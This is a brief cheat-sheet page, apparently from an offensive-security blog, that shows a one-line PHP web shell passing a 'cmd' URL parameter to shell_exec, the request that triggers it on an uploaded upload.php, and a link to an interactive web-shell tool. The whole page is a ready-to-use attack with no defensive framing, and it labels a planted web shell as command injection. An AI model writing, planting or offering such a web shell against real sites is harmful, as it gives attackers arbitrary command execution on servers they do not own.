---
title: PHP Command Injection
categories: [Cheat-Sheet,Web]
tags: [Cheat-Sheet]
---

# Example of PHP Command Injection
- create a php file with below command

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

- trigger the php file

```bash
www.website.com/upload.php?cmd=whoami
```

# Useful-Links
- Interactive shell - [p0wny-shell](https://github.com/flozz/p0wny-shell)